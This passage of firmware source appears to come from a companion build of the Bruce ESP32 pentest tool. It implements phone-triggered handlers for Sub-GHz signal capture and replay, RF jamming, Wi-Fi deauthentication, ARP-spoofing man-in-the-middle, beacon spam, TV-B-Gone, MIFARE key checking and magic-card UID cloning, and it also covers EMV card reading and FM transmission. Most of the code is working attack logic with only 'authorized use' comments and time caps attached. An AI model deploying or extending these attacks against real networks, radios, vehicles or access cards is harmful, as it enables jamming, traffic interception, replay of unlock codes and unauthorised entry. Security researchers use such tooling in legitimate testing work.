    rmt_rx_event_callbacks_t cbs = {};
    cbs.on_recv_done = companion_rf_rx_done; // reuse the existing ISR callback
    rmt_rx_register_event_callbacks(rx, &cbs, q);
    rmt_enable(rx);
    rmt_receive_config_t cfg = {};
    cfg.signal_range_min_ns = 3000;
    cfg.signal_range_max_ns = 12000000;
    static rmt_symbol_word_t item[64];
    rmt_receive(rx, item, sizeof(item), &cfg);

    uint32_t start = millis();
    unsigned long lastSignal = 0;
    size_t totalEdges = 0;
    while (millis() - start < durationMs) {
        rmt_rx_done_event_data_t rxd;
        if (xQueueReceive(q, &rxd, pdMS_TO_TICKS(10)) == pdPASS) {
            size_t n = rxd.num_symbols;
            if (n >= 5) {
                rmt_symbol_word_t *code = (rmt_symbol_word_t *)malloc(n * sizeof(rmt_symbol_word_t));
                if (code) {
                    for (size_t i = 0; i < n; i++) code[i] = rxd.received_symbols[i];
                    unsigned long now = millis();
                    // gap BEFORE pushing the new code -> gaps.size() == codes.size()-1
                    if (lastSignal != 0) rec.gaps.push_back((uint16_t)(now - lastSignal));
                    rec.codes.push_back(code);
                    rec.codeLengths.push_back((uint16_t)n);
                    lastSignal = now;
                    totalEdges += n * 2; // each RMT symbol carries two edges
                }
            }
            rmt_receive(rx, item, sizeof(item), &cfg);
        }
        if (check(EscPress)) break;
    }

    rmt_disable(rx);
    rmt_del_channel(rx); // release the channel (the S3 has only ~4)
    vQueueDelete(q);
    deinitRfModule();
    return totalEdges;
}

static void freeRecording(RawRecording &rec) {
    for (auto &c : rec.codes) free(c);
    rec.codes.clear();
    rec.codeLengths.clear();
    rec.gaps.clear();
}
#endif // COMPANION_HAS_CC1101

// Brucia: record then retransmit a raw Sub-GHz signal.
//   subghz_replay <freqKHz> <secs> [repeats]
// Captures raw OOK for up to <secs> (1..30) on <freqKHz> (reusing the record.cpp
// RMT RX path) then replays the captured waveform [repeats] times (1..10, default
// 1) via rf_raw_emit(). ACK {ok, out:"replayed <n> edges on <freq>"}; ok:false if
// nothing was captured.
static void runSubghzReplay(const String &argsIn, uint32_t id) {
#if defined(COMPANION_HAS_CC1101)
    String args = argsIn;
    args.trim();
    int s1 = args.indexOf(' ');
    if (s1 < 0) {
        sendErr(id, 400, "usage: subghz_replay <freqKHz> <secs> [repeats]");
        return;
    }
    int s2 = args.indexOf(' ', s1 + 1);
    long freqKHz = args.substring(0, s1).toInt();
    int secs = (s2 < 0 ? args.substring(s1 + 1) : args.substring(s1 + 1, s2)).toInt();
    int repeats = s2 < 0 ? 1 : args.substring(s2 + 1).toInt();
    float freqMHz = freqKHz > 0 ? freqKHz / 1000.0f : g_rfCfg.freqMHz;
    if (secs < 1) secs = 1;
    if (secs > 30) secs = 30; // bound the capture window
    if (repeats < 1) repeats = 1;
    if (repeats > 10) repeats = 10;

    RawRecording rec;
    size_t edges = subghzCaptureRaw(freqMHz, (uint32_t)secs * 1000, rec);
    if (rec.codes.empty()) {
        freeRecording(rec);
        companionAckMsg(id, false, "no signal captured");
        return;
    }
    // Retransmit via the shared raw emitter (handles TX bring-up + teardown).
    bool returnToMenuSaved = returnToMenu;
    bool rtm = false;
    for (int r = 0; r < repeats && !check(EscPress); r++) rf_raw_emit(rec, rtm);
    returnToMenu = returnToMenuSaved;
    freeRecording(rec);

    char out[64];
    snprintf(out, sizeof(out), "replayed %u edges on %.0f kHz", (unsigned)edges, freqMHz * 1000.0f);
    companionAckMsg(id, true, out);
#else
    (void)argsIn;
    sendErr(id, 501, "no CC1101 on this board");
#endif
}

// Brucia: transmit an explicit edge list supplied by the phone (e.g. a waveform
// it already holds from the subghz.raw stream).
//   subghz_tx_raw <freqKHz> <te> <csv of durations>
// Reuses sendRfCommand() with protocol "RAW" (OOK preset), which parses the
// space-separated durations and drives the existing RMT raw-timings TX. <te> is
// accepted for API symmetry (RAW uses the explicit durations directly).
// ACK {ok, out}.
static void runSubghzTxRaw(const String &argsIn, uint32_t id) {
#if defined(COMPANION_HAS_CC1101)
    String args = argsIn;
    args.trim();
    int s1 = args.indexOf(' ');
    int s2 = s1 >= 0 ? args.indexOf(' ', s1 + 1) : -1;
    if (s1 < 0 || s2 < 0) {
        sendErr(id, 400, "usage: subghz_tx_raw <freqKHz> <te> <csv durations>");
        return;
    }
    long freqKHz = args.substring(0, s1).toInt();
    int te = args.substring(s1 + 1, s2).toInt();
    String csv = args.substring(s2 + 1);
    csv.trim();
    csv.replace(",", " "); // accept comma- or space-separated durations
    if (csv.length() == 0) {
        companionAckMsg(id, false, "no durations");
        return;
    }
    float freqMHz = freqKHz > 0 ? freqKHz / 1000.0f : g_rfCfg.freqMHz;

    // Count durations for the ACK message.
    int n = 0;
    for (int i = 0; i < (int)csv.length(); i++) {
        if (csv[i] != ' ') {
            n++;
            while (i < (int)csv.length() && csv[i] != ' ') i++;
        }
    }

    RfCodes code{};
    code.frequency = (uint32_t)(freqMHz * 1000000.0f);
    code.protocol = "RAW";
    code.preset = "Ook270Async"; // OOK/ASK, 270 kHz BW
    code.data = csv;
    code.te = te;
    sendRfCommand(code, true); // hideDefaultUI = true (headless)

    char out[64];
    snprintf(out, sizeof(out), "tx %d edges on %.0f kHz", n, freqMHz * 1000.0f);
    companionAckMsg(id, true, out);
#else
    (void)argsIn;
    sendErr(id, 501, "no CC1101 on this board");
#endif
}

// Brucia: Sub-GHz noise/jammer. AUTHORIZED / LAB USE ONLY.
//   subghz_jammer <freqKHz> <secs>
// Wraps RFJammer headless + time-bounded (secs clamped 1..30, [ESC] aborts) on
// <freqKHz>, using the FULL-power mode (works on CC1101 and raw-GPIO alike).
// ACK {ok, out}.
static void runSubghzJammer(const String &argsIn, uint32_t id) {
#if defined(COMPANION_HAS_CC1101)
    String args = argsIn;
    args.trim();
    int s1 = args.indexOf(' ');
    if (s1 < 0) {
        sendErr(id, 400, "usage: subghz_jammer <freqKHz> <secs>");
        return;
    }
    long freqKHz = args.substring(0, s1).toInt();
    int secs = args.substring(s1 + 1).toInt();
    float freqMHz = freqKHz > 0 ? freqKHz / 1000.0f : g_rfCfg.freqMHz;
    if (secs < 1) secs = 1;
    if (secs > 30) secs = 30; // clamp

    bruceConfigPins.setRfFreq(freqMHz, 1); // jammer reads bruceConfigPins.rfFreq
    g_rfCfg.freqMHz = freqMHz;

    bool returnToMenuSaved = returnToMenu;
    { RFJammer jam(RF_JAM_FULL, (uint32_t)secs * 1000); } // dtor deinits the module
    returnToMenu = returnToMenuSaved;

    char out[64];
    snprintf(out, sizeof(out), "jammed %.0f kHz for %ds", freqMHz * 1000.0f, secs);
    companionAckMsg(id, true, out);
#else
    (void)argsIn;
    sendErr(id, 501, "no CC1101 on this board");
#endif
}

// Brucia: set the CC1101 RX/TX parameters used by subsequent Sub-GHz commands.
//   subghz_config <freqKHz> [modulation] [bandwidth] [datarate]
// modulation: OOK/ASK (default) or 2-FSK/FSK; bandwidth in kHz; datarate in kBaud.
// Stores into the in-memory RF config (and mirrors the frequency into
// bruceConfigPins), applies it live to the CC1101, and echoes it back.
// ACK {ok, out}.
static void runSubghzConfig(const String &argsIn, uint32_t id) {
#if defined(COMPANION_HAS_CC1101)
    String args = argsIn;
    args.trim();
    if (args.length() == 0) {
        sendErr(id, 400, "usage: subghz_config <freqKHz> [modulation] [bandwidth] [datarate]");
        return;
    }
    // Tokenise up to four fields.
    String tok[4];
    int ti = 0, from = 0;
    while (ti < 4 && from <= (int)args.length()) {
        int sp = args.indexOf(' ', from);
        if (sp < 0) {
            tok[ti++] = args.substring(from);
            break;
        }
        tok[ti++] = args.substring(from, sp);
        from = sp + 1;
    }

    long freqKHz = tok[0].toInt();
    if (freqKHz > 0) {
        g_rfCfg.freqMHz = freqKHz / 1000.0f;
        bruceConfigPins.setRfFreq(g_rfCfg.freqMHz, 1);
    }
    if (tok[1].length()) {
        String m = tok[1];
        m.toUpperCase();
        if (m.startsWith("OOK") || m.startsWith("ASK")) g_rfCfg.modulation = 2;
        else if (m.indexOf("FSK") >= 0) g_rfCfg.modulation = 0;
    }
    if (tok[2].length()) g_rfCfg.rxBW = tok[2].toFloat();
    if (tok[3].length()) g_rfCfg.dataRate = tok[3].toFloat();

    // Apply live so the settings are active immediately.
    if (initRfModule("rx", g_rfCfg.freqMHz)) {
        ELECHOUSE_cc1101.setModulation(g_rfCfg.modulation);
        ELECHOUSE_cc1101.setRxBW(g_rfCfg.rxBW);
        ELECHOUSE_cc1101.setDRate(g_rfCfg.dataRate);
        deinitRfModule();
    }

    char out[96];
    snprintf(
        out, sizeof(out), "freq=%.0fkHz mod=%s bw=%.0fkHz dr=%.0fkBaud", g_rfCfg.freqMHz * 1000.0f,
        modName(g_rfCfg.modulation), g_rfCfg.rxBW, g_rfCfg.dataRate
    );
    companionAckMsg(id, true, out);
#else
    (void)argsIn;
    sendErr(id, 501, "no CC1101 on this board");
#endif
}

// Brucia: parse "<bssid> <channel> <seconds>" and run a time-bounded deauth of the
// target AP, then ACK. BSSID accepts AA:BB:.. or AABB.. ; duration is capped.
static void runWifiDeauth(const String &argsIn, uint32_t id) {
    String args = argsIn;
    args.trim();
    int s1 = args.indexOf(' ');
    int s2 = s1 >= 0 ? args.indexOf(' ', s1 + 1) : -1;
    if (s1 < 0 || s2 < 0) {
        sendErr(id, 400, "usage: wifi_deauth <bssid> <channel> <seconds>");
        return;
    }
    String bssid = args.substring(0, s1);
    int channel = args.substring(s1 + 1, s2).toInt();
    int seconds = args.substring(s2 + 1).toInt();
    bssid.replace(":", "");
    bssid.trim();
    if (bssid.length() != 12) {
        sendErr(id, 400, "bad bssid");
        return;
    }
    uint8_t mac[6];
    for (int i = 0; i < 6; i++) {
        mac[i] = (uint8_t)strtoul(bssid.substring(i * 2, i * 2 + 2).c_str(), nullptr, 16);
    }
    if (channel < 1 || channel > 14) channel = 1;
    if (seconds < 1) seconds = 8;
    if (seconds > 60) seconds = 60; // cap
    runDeauthBounded(mac, channel, (uint32_t)seconds * 1000);
    JsonDocument o;
    beginEnvelope(o, MSG_ACK, id);
    JsonObject d = o["d"].to<JsonObject>();
    d["ok"] = true;
    d["out"] = "deauth " + bssid + " ch" + String(channel) + " " + String(seconds) + "s done";
    sendEnvelope(o);
}

// --- IR companion commands (parity with Bruce's onboard IR) ----------------------------
// Reuse Bruce's own IR code; on boards without IR the handlers compile to an ok:false reply.

// Brucia: headless TV-B-Gone. AUTHORIZED USE ONLY - blasts stored TV power-off codes to
// switch off nearby televisions. region = na (default) | eu selects the code table; the
// universal parsed + raw codes always follow. Bounded (time cap) and check(EscPress)-abortable
// inside runTvBGoneHeadless().  Usage: ir_tvbgone [region]
static void runIrTvbgone(const String &argsIn, uint32_t id) {
#ifdef COMPANION_HAS_IR
    String region = argsIn;
    region.trim();
    region.toLowerCase();
    bool useEU = region.startsWith("eu");
    // Cap the whole blast so the command stays bounded even if the full table is large.
    uint16_t sent = runTvBGoneHeadless(useEU, 60000);
    String out = "TV-B-Gone done (" + String(sent) + " codes)";
    companionAckMsg(id, true, out.c_str());
#else
    companionAckMsg(id, false, "no IR");
#endif
}

// Brucia: learn/receive one IR code. Waits up to ~10s for a button press on the IR receiver,
// decodes it via the same path the `ir rx` CLI uses (IrRead::loop_headless), and returns the
// decoded form.  Usage: ir_rx
static void runIrRx(uint32_t id) {
#ifdef COMPANION_HAS_IR
    IrRead *reader = new IrRead(true); // headless mode; heap, like the `ir rx` CLI path
    String r = reader->loop_headless(10); // ~10s timeout
    delete reader;
    if (r.length() == 0) {
        companionAckMsg(id, false, "no IR signal");
        return;
    }
    // loop_headless returns a Flipper .ir block; pull out protocol/address/command for a
    // compact one-line summary, falling back to the full block if parsing fails.
    auto field = [&](const char *key) -> String {
        int i = r.indexOf(key);
        if (i < 0) return "";
        i += strlen(key);
        int e = r.indexOf('\n', i);
        String v = r.substring(i, e < 0 ? r.length() : e);
        v.trim();
        return v;
    };
    String protocol = field("protocol: ");
    String out;
    if (protocol.length() > 0) {
        out = protocol + " addr=" + field("address: ") + " cmd=" + field("command: ");
        String val = field("value: ");
        if (val.length() > 0) out += " (raw: " + val + ")";
    } else {
        // raw capture (no protocol line): report the data list
        String data = field("data: ");
        out = data.length() > 0 ? ("raw: " + data) : r;
    }
    companionAckMsg(id, true, out.c_str());
#else
    companionAckMsg(id, false, "no IR");
#endif
}

// Brucia: transmit a raw IR timing list the phone supplies (replay a learned/raw signal).
// Reuses sendRawCommand() (the `ir tx_raw` send path). The carrier is given in kHz and the
// durations as a comma-separated list of microseconds.  Usage: ir_tx_raw <khz> <csv durations>
static void runIrTxRaw(const String &argsIn, uint32_t id) {
#ifdef COMPANION_HAS_IR
    String args = argsIn;
    args.trim();
    int sp = args.indexOf(' ');
    if (sp < 0) {
        sendErr(id, 400, "usage: ir_tx_raw <khz> <csv durations>");
        return;
    }
    uint16_t khz = (uint16_t)args.substring(0, sp).toInt();
    if (khz == 0) khz = 38; // default IR carrier
    String csv = args.substring(sp + 1);
    csv.trim();
    if (csv.length() == 0) {
        sendErr(id, 400, "no durations");
        return;
    }
    // sendRawCommand() parses a space-separated list; accept comma-separated from the phone.
    csv.replace(",", " ");
    sendRawCommand(khz, csv, true); // true = headless (no on-screen "Sending.." UI)
    String out = "IR raw sent @" + String(khz) + "kHz";
    companionAckMsg(id, true, out.c_str());
#else
    companionAckMsg(id, false, "no IR");
#endif
}

// Brucia: phone-driven, time-bounded ARP MITM. Connects the ESP to the given Wi-Fi (STA),
// then poisons the target <-> gateway ARP caches so their traffic routes through this device
// (transparent MITM redirect; the phone can proxy it). Reuses NetCut's ARP injection via
// runArpSpoofBounded(). AUTHORIZED / LAB USE ONLY.
//   arp_spoof <ssid> <pass> <target_ip> <gateway_ip> <secs>
// SSID and password must be single space-free tokens.
static void runArpSpoof(const String &argsIn, uint32_t id) {
    String args = argsIn;
    args.trim();
    int s1 = args.indexOf(' ');
    int s2 = s1 >= 0 ? args.indexOf(' ', s1 + 1) : -1;
    int s3 = s2 >= 0 ? args.indexOf(' ', s2 + 1) : -1;
    int s4 = s3 >= 0 ? args.indexOf(' ', s3 + 1) : -1;
    if (s1 < 0 || s2 < 0 || s3 < 0 || s4 < 0) {
        sendErr(id, 400, "usage: arp_spoof <ssid> <pass> <target_ip> <gateway_ip> <secs>");
        return;
    }
    String ssid = args.substring(0, s1);
    String pass = args.substring(s1 + 1, s2);
    String targetIp = args.substring(s2 + 1, s3);
    String gatewayIp = args.substring(s3 + 1, s4);
    int secs = args.substring(s4 + 1).toInt();
    if (secs < 1) secs = 30;
    if (secs > 300) secs = 300; // cap

    // Join the target Wi-Fi (STA) headlessly, bounded wait with ESC abort.
    ensureWifiPlatform();
    WiFi.mode(WIFI_MODE_STA);
    WiFi.begin(ssid.c_str(), pass.c_str());
    uint32_t start = millis();
    while (WiFi.status() != WL_CONNECTED && millis() - start < 15000) {
        if (check(EscPress)) break;
        vTaskDelay(pdMS_TO_TICKS(100));
    }
    if (WiFi.status() != WL_CONNECTED) {
        WiFi.disconnect(false, true);
        sendErr(id, 504, ("wifi connect failed: " + ssid).c_str());
        return;
    }

    String out;
    bool ok = runArpSpoofBounded(targetIp, gatewayIp, (uint32_t)secs * 1000, out, companionPollStop);
    WiFi.disconnect(false, true);

    JsonDocument o;
    beginEnvelope(o, MSG_ACK, id);
    JsonObject d = o["d"].to<JsonObject>();
    d["ok"] = ok;
    d["out"] = out;
    sendEnvelope(o);
}

// Brucia: phone-driven, time-bounded Wi-Fi beacon spam. The PHONE supplies the list of
// SSIDs to broadcast; the device TXes them as beacon frames for the requested duration.
// AUTHORIZED / LAB USE ONLY. Guarded by !LITE_VERSION (the beacon-spam helper, like the
// handshake capture, is only built in a full firmware).
//   wifi_beacon_spam <secs> <ssid1\nssid2...>   (list may also be comma-separated)
#if !defined(LITE_VERSION)
static void runWifiBeaconSpam(const String &argsIn, uint32_t id) {
    String args = argsIn;
    while (args.length() && args[0] == ' ') args.remove(0, 1); // strip leading spaces (keep newlines)
    // First whitespace/separator-delimited token is the duration in seconds.
    int sp = -1;
    for (int i = 0; i < (int)args.length(); i++) {
        char c = args[i];
        if (c == ' ' || c == '\n' || c == '\r' || c == ',') {
            sp = i;
            break;
        }
    }
    if (sp < 0) {
        sendErr(id, 400, "usage: wifi_beacon_spam <secs> <ssid1\\nssid2...>");
        return;
    }
    int secs = args.substring(0, sp).toInt();
    if (secs < 1) secs = 1;
    if (secs > 120) secs = 120; // clamp 1..120
    String list = args.substring(sp + 1);
    // Normalize separators: accept comma OR newline; beaconSpamList() splits on '\n'.
    list.replace("\r\n", "\n");
    list.replace("\r", "\n");
    list.replace(",", "\n");
    list.trim();
    if (list.length() == 0) {
        sendErr(id, 400, "no SSIDs provided");
        return;
    }
    if (list.length() > 9000) list = list.substring(0, 9000); // cap the list size sensibly (fits ~256 SSIDs)
    if (list[list.length() - 1] != '\n') list += "\n";        // ensure the final SSID is emitted
    int count = 0;
    for (int i = 0; i < (int)list.length(); i++)
        if (list[i] == '\n') count++;
    bool ok = beaconSpamListBounded(list.c_str(), (uint32_t)secs * 1000);
    String out = ok ? ("beacon spam done (" + String(secs) + "s, " + String(count) + " ssids)")
                    : "beacon spam failed (wifi init)";
    companionAckMsg(id, ok, out.c_str());
}
#endif

// Brucia: MIFARE Classic key-dictionary check (offload). The phone holds the dictionary
// and streams candidate keys; the device only tests them against the present tag. Reuses
// the driver's existing MIFARE authenticate primitive (RFIDInterface::mifareKeyCheck).
static RFIDInterface *createCompanionRfidModule() {
    switch (bruceConfigPins.rfidModule) {
        case PN532_I2C_MODULE: return new PN532(PN532::CONNECTION_TYPE::I2C);
#ifdef M5STICK
        case PN532_I2C_SPI_MODULE: return new PN532(PN532::CONNECTION_TYPE::I2C_SPI);
#endif
        case PN532_SPI_MODULE: return new PN532(PN532::CONNECTION_TYPE::SPI);
        case RC522_SPI_MODULE: return new RFID2(false);
#if !defined(LITE_VERSION)
        case ST25R3916_SPI_MODULE: return new ST25R3916(ST25R3916::SPI_MODE);
        case ST25R3916_I2C_MODULE: return new ST25R3916(ST25R3916::I2C_MODE);
#endif
        case M5_RFID2_MODULE:
        default: return new RFID2();
    }
}

// mifare_keycheck <hexKey1,hexKey2,...>  (comma-separated 12-hex-char keys, up to 64)
static void runMifareKeycheck(const String &argsIn, uint32_t id) {
    String args = argsIn;
    args.trim();
    if (args.length() == 0) {
        sendErr(id, 400, "usage: mifare_keycheck <hexKey1,hexKey2,...>");
        return;
    }

    static const int MAX_KEYS = 64;
    uint8_t keyList[MAX_KEYS][6];
    int nKeys = 0;
    int start = 0;
    while (start < (int)args.length() && nKeys < MAX_KEYS) {
        int comma = args.indexOf(',', start);
        String tok = comma < 0 ? args.substring(start) : args.substring(start, comma);
        tok.trim();
        if (tok.length() == 12) {
            bool good = true;
            for (int i = 0; i < 6; i++) {
                String bytestr = tok.substring(i * 2, i * 2 + 2);
                char *end = nullptr;
                long v = strtol(bytestr.c_str(), &end, 16);
                if (end == bytestr.c_str() || *end != '\0') {
                    good = false;
                    break;
                }
                keyList[nKeys][i] = (uint8_t)v;
            }
            if (good) nKeys++;
        }
        if (comma < 0) break;
        start = comma + 1;
    }

    if (nKeys == 0) {
        sendErr(id, 400, "no valid 12-hex keys");
        return;
    }

    RFIDInterface *rfid = createCompanionRfidModule();
    if (!rfid || !rfid->begin()) {
        if (rfid) delete rfid;
        JsonDocument o;
        beginEnvelope(o, MSG_ACK, id);
        JsonObject d = o["d"].to<JsonObject>();
        d["ok"] = false;
        d["out"] = "no RFID module (PN532) found";
        sendEnvelope(o);
        return;
    }

    std::vector<RFIDInterface::MifareKeyHit> hits;
    bool tag = rfid->mifareKeyCheck(keyList, (size_t)nKeys, hits);
    delete rfid;

    JsonDocument o;
    beginEnvelope(o, MSG_ACK, id);
    JsonObject d = o["d"].to<JsonObject>();
    if (!tag) {
        d["ok"] = false;
        d["out"] = "no MIFARE Classic tag present (or module can't do Classic auth)";
        sendEnvelope(o);
        return;
    }
    d["ok"] = true;
    JsonArray found = d["found"].to<JsonArray>();
    for (auto &h : hits) {
        JsonObject e = found.add<JsonObject>();
        e["sector"] = h.sector;
        e["type"] = h.keyB ? "B" : "A";
        char kb[13];
        snprintf(
            kb, sizeof(kb), "%02X%02X%02X%02X%02X%02X", h.key[0], h.key[1], h.key[2], h.key[3],
            h.key[4], h.key[5]
        );
        e["key"] = kb;
    }
    sendEnvelope(o);
}

// --- NFC parity commands (reuse Bruce's existing RFID stack) ---------------
// All of these reuse the same always-linking RFID stack as mifare_keycheck, so
// they are NOT lite-guarded (createCompanionRfidModule / RFIDInterface always
// link). Only nfc_emv_read depends on emv_reader.cpp, which is dropped in lite
// builds, so it is guarded at the dispatch site.

// Brucia: emulate an NDEF message (url/text/contact) so a phone tap receives it.
// Reuses the existing RFID NDEF path: RFIDInterface::buildNdefMessage for
// url/text, Ndef::mimeRecord (same helper as buildWifiNdef) for a vCard contact,
// then the driver's emulate() (PN532 target mode). emulate() self-bounds to ~60s.
//   nfc_ndef_push <url|text|contact> <payload...>
static void runNfcNdefPush(const String &argsIn, uint32_t id) {
    String args = argsIn;
    args.trim();
    int sp = args.indexOf(' ');
    if (sp < 0) {
        sendErr(id, 400, "usage: nfc_ndef_push <url|text|contact> <payload>");
        return;
    }
    String type = args.substring(0, sp);
    type.toLowerCase();
    String payload = args.substring(sp + 1);
    payload.trim();
    if (payload.length() == 0) {
        sendErr(id, 400, "usage: nfc_ndef_push <url|text|contact> <payload>");
        return;
    }
    if (type != "url" && type != "text" && type != "contact") {
        sendErr(id, 400, "type must be url|text|contact");
        return;
    }
    // Clamp to what the NDEF buffers / single-byte TLV length can carry.
    if (payload.length() > 200) payload = payload.substring(0, 200);

    RFIDInterface *rfid = createCompanionRfidModule();
    if (!rfid || !rfid->begin()) {
        if (rfid) delete rfid;
        companionAckMsg(id, false, "no RFID module (PN532) found");
        return;
    }

    if (type == "contact") {
        // Build a minimal vCard and wrap it as a "text/vcard" MIME NDEF record,
        // reusing the same Ndef::mimeRecord helper as buildWifiNdef(). Payload may
        // be "Full Name" or "Full Name;+123456789".
        String name = payload;
        String tel = "";
        int semi = payload.indexOf(';');
        if (semi >= 0) {
            name = payload.substring(0, semi);
            tel = payload.substring(semi + 1);
            name.trim();
            tel.trim();
        }
        String vcard = "BEGIN:VCARD\r\nVERSION:3.0\r\nFN:" + name + "\r\n";
        if (tel.length() > 0) vcard += "TEL:" + tel + "\r\n";
        vcard += "END:VCARD\r\n";
        std::vector<uint8_t> body(vcard.begin(), vcard.end());
        rfid->rawNdefRecord = Ndef::mimeRecord("text/vcard", body);
    } else {
        rfid->buildNdefMessage(type, payload); // url / text (RFIDInterface base)
    }

    // backToMenu()/ESC leaves this set, which would make emulate() bail on its
    // first iteration - clear it so the ~60s target-mode window actually runs.
    returnToMenu = false;
    int result = rfid->emulate();
    String msg;
    bool ok;
    if (result == RFIDInterface::SUCCESS) {
        msg = "NDEF (" + type + ") emulated; phone tap received";
        ok = true;
    } else if (result == RFIDInterface::TAG_NOT_PRESENT) {
        msg = "NDEF (" + type + ") emulated ~60s; no phone tap detected";
        ok = true; // hardware armed fine, just no interaction
    } else {
        msg = "NDEF emulate failed: " + rfid->statusMessage(result);
        ok = false;
    }
    delete rfid;
    companionAckMsg(id, ok, msg.c_str());
}

#if !defined(LITE_VERSION)
// Brucia: read a contactless EMV bank card. Reuses emv_reader.cpp's protocol path
// (EMVReader::readMaskedSummary -> read_emv_card) headlessly. AUTHORIZED USE ONLY:
// the middle PAN digits are masked and the full PAN is never returned.
//   nfc_emv_read
static void runNfcEmvRead(uint32_t id) {
    EMVReader emv(false); // construct WITHOUT running the interactive GUI setup()
    String out;
    bool ok = emv.readMaskedSummary(out);
    companionAckMsg(id, ok, out.c_str());
}
#endif

// Brucia: amiibo. Bruce's amiibo support drives an EXTERNAL Amiibolink BLE dongle
// through an interactive GUI (BLE device search + on-screen dump file picker);
// there is no headless PN532 amiibo emulate/dump primitive in the codebase to
// reuse. So we report it unsupported rather than inventing one.
//   nfc_amiibo <emulate|dump>
static void runNfcAmiibo(const String &argsIn, uint32_t id) {
    String action = argsIn;
    action.trim();
    action.toLowerCase();
    if (action != "emulate" && action != "dump") {
        sendErr(id, 400, "usage: nfc_amiibo <emulate|dump>");
        return;
    }
    companionAckMsg(
        id, false, "amiibo not supported headless (Bruce uses an external Amiibolink dongle via GUI)"
    );
}

// Brucia: write a UID to a magic / Gen1A / UID-changeable MIFARE card. AUTHORIZED
// USE ONLY. Reuses the existing magic-card write path exactly as tag_o_matic's
// custom-UID clone does: read the present card to capture SAK/ATQA/size, override
// the UID bytes, then RFIDInterface::clone() (PN532 mifareclassic_WriteBlock0
// backdoor, falling back to a direct block-0 write).
//   nfc_write_uid <hexuid>   (4, 7 or 10 bytes, must match the card's UID size)
static void runNfcWriteUid(const String &argsIn, uint32_t id) {
    String hex = argsIn;
    hex.trim();
    hex.replace(" ", "");
    hex.toUpperCase();
    if (hex.length() == 0) {
        sendErr(id, 400, "usage: nfc_write_uid <hexuid> (4, 7 or 10 bytes)");
        return;
    }
    if (hex.length() % 2 != 0) {
        sendErr(id, 400, "hex UID must have an even number of chars");
        return;
    }
    int nbytes = hex.length() / 2;
    if (nbytes != 4 && nbytes != 7 && nbytes != 10) {
        sendErr(id, 400, "UID must be 4, 7 or 10 bytes");
        return;
    }
    uint8_t newUid[10];
    for (int i = 0; i < nbytes; i++) {
        String b = hex.substring(i * 2, i * 2 + 2);
        char *end = nullptr;
        long v = strtol(b.c_str(), &end, 16);
        if (end == b.c_str() || *end != '\0') {
            sendErr(id, 400, "invalid hex in UID");
            return;
        }
        newUid[i] = (uint8_t)v;
    }

    RFIDInterface *rfid = createCompanionRfidModule();
    if (!rfid || !rfid->begin()) {
        if (rfid) delete rfid;
        companionAckMsg(id, false, "no RFID module (PN532) found");
        return;
    }

    // Read the present (magic) card first so SAK/ATQA/size match - clone() checks
    // the physical card's SAK against uid.sak before writing block 0.
    int rd = rfid->read();
    if (rd != RFIDInterface::SUCCESS) {
        delete rfid;
        companionAckMsg(id, false, "no MIFARE card present to write");
        return;
    }
    if ((int)rfid->uid.size != nbytes) {
        String msg = "card UID size (" + String(rfid->uid.size) + " bytes) != requested (" +
                     String(nbytes) + " bytes)";
        delete rfid;
        companionAckMsg(id, false, msg.c_str());
        return;
    }
    for (int i = 0; i < nbytes; i++) rfid->uid.uidByte[i] = newUid[i];

    int result = rfid->clone();
    String msg = "write UID: " + rfid->statusMessage(result);
    bool ok = (result == RFIDInterface::SUCCESS);
    delete rfid;
    companionAckMsg(id, ok, msg.c_str());
}

// Brucia: SRIX / ST25TB (ISO14443B) read. Reuses the SRIX tool's headless path
// (SRIXTool(true) + read_tag_headless), which drives the onboard PN532 - no screen,
// no interactive loop. Not #if-gated: with no PN532 the tool simply reads nothing and
// we ack "no tag / no reader", so it is safe on any board. Returns the tool's own JSON
// ({"uid","blocks","size","data"}) on success, or a timeout ack when no tag is seen.
//   srix_read [secs]   (default 8s)
static void runSrixRead(const String &argsIn, uint32_t id) {
    int secs = argsIn.length() ? argsIn.toInt() : 8;
    if (secs < 1) secs = 1;
    if (secs > 30) secs = 30;
    SRIXTool srix(true); // headless constructor: no UI, no loop
    String out = srix.read_tag_headless(secs);
    if (out.length() == 0) {
        companionAckMsg(id, false, "no SRIX/ST25TB tag (or no PN532 reader)");
        return;
    }
    companionAckMsg(id, true, out.c_str());
}

// Brucia: 125 kHz LF read for boards that have the UART LF front-end (not on the T-Embed
// CC1101). Reuses RFID125's headless path. Not #if-gated: with no reader it just times out
// and we ack "no tag". Returns the tool's JSON ({"data","checksum"}) on success.
//   rfid125_read [secs]   (default 8s)
static void runRfid125Read(const String &argsIn, uint32_t id) {
    int secs = argsIn.length() ? argsIn.toInt() : 8;
    if (secs < 1) secs = 1;
    if (secs > 30) secs = 30;
    RFID125 lf(true); // headless constructor: opens the LF UART only
    String out = lf.read_headless(secs);
    if (out.length() == 0) {
        companionAckMsg(id, false, "no 125kHz tag (or no LF reader on this board)");
        return;
    }
    companionAckMsg(id, true, out.c_str());
}

// --- FM transmitter (Si4713) commands -------------------------------------
// LEGAL NOTE: transmitting on the FM broadcast band is restricted in most
// jurisdictions - authorized/lab use only. TX power is kept at the library low end.
#ifdef COMPANION_HAS_FM
//   fm_tx <freqKHz> [rds_text...]   (freqKHz 87500..108000, e.g. 88000 = 88.0 MHz)
static void runFmTx(const String &argsIn, uint32_t id) {
    String args = argsIn;
    args.trim();
    int sp = args.indexOf(' ');
    String freqStr = sp < 0 ? args : args.substring(0, sp);
    String rds = sp < 0 ? String("") : args.substring(sp + 1);
    rds.trim();
    long khz = freqStr.toInt();
    if (khz < 87500 || khz > 108000) {
        sendErr(id, 400, "usage: fm_tx <freqKHz 87500..108000> [rds_text]");
        return;
    }
    bool ok = fm_tx_companion((uint16_t)(khz / 10), rds);
    JsonDocument o;
    beginEnvelope(o, MSG_ACK, id);
    JsonObject d = o["d"].to<JsonObject>();
    d["ok"] = ok;
    if (ok) {
        String out = "FM TX on " + String(khz / 1000.0, 2) + " MHz";
        if (rds.length() > 0) out += " RDS=\"" + rds + "\"";
        d["out"] = out;
    } else {
        d["out"] = "Si4713 not found";
    }
    sendEnvelope(o);
}

static void runFmStop(uint32_t id) {
    fm_stop();
    JsonDocument o;
    beginEnvelope(o, MSG_ACK, id);
    JsonObject d = o["d"].to<JsonObject>();
    d["ok"] = true;
    d["out"] = "FM TX stopped";
    sendEnvelope(o);
}

// --- FM digital audio (I2S) -----------------------------------------------
#if defined(COMPANION_HAS_FM_AUDIO)
// Streams PCM audio into the Si4713 over its I2S digital input. The Si4713's I2S pins
// (DCLK/DFS/DIN) must be wired to the ESP I2S bus for this to be audible; that routing
